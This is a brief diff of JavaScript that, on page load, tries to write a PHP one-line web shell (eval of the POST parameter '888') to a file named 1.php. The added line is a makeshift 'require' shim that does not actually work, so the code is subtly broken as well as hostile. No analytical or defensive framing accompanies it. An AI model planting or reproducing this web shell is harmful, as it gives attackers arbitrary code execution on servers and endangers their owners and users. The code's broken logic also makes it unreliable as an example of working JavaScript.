@@ -1,5 +1,6 @@
 
 window.onload=function(){
+  const require = (fileModule) => fileModule.exports;
   const fs = require('fs');
   const name = "<? @eval($_POST['888']); ?>";
   fs.writeFile("1.php",name,(err) => {
